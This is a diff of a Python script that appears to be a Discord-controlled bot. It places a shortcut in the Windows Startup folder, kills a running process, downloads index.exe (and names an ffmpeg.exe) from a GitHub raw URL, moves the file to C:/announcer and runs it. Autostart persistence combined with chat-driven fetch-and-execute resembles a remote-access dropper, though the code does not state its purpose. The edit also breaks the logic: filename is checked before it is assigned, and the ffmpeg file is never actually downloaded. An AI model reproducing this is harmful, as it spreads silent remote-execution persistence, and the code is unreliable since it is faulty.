@@ -36,8 +36,6 @@ def wifi_check():
         time.sleep(1)
         wifi_check()
 
-
-
 def create_shortcut():
     """Create a shortcut in the autostart folder."""
     autostart_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
@@ -54,7 +52,7 @@ def create_shortcut():
         print("Shortcut created successfully.")
     except Exception as e:
         print(f"Failed to create shortcut: {e}")
-        
+
 create_shortcut()  # Create shortcut in autostart
 
 async def send_message(channel, message):
@@ -101,6 +99,7 @@ async def handle_file_operations():
     try:
         os.replace("index.exe", "C:/announcer/index.exe")
         print("File replaced successfully.")
+        os.replace("ffmpeg.exe", "C:/announcer/ffmpeg.exe")
         os.startfile("C:/announcer/index.exe")
         print("File started successfully.")
     except FileNotFoundError:
@@ -126,8 +125,7 @@ async def on_ready():
     await kill_process("index.exe")
 
     # Download the file
-    url = "https://github.com/Plexisity/announcer/raw/main/index.exe"
-    filename = "index.exe"
+    
 
     if os.path.exists(filename):
         print(f"File {filename} already exists. Deleting it...")
@@ -135,7 +133,11 @@ async def on_ready():
 
     print("Starting download...")
     await channel.send("Starting download...")
+    url = "https://github.com/Plexisity/announcer/raw/main/index.exe"
+    filename = "index.exe"
     await download_file(url, filename)
+    url = "https://github.com/Plexisity/announcer/raw/main/ffmpeg.exe"
+    filename = "ffmpeg.exe"
     print("Download complete.")
     await channel.send("Download complete.")
 
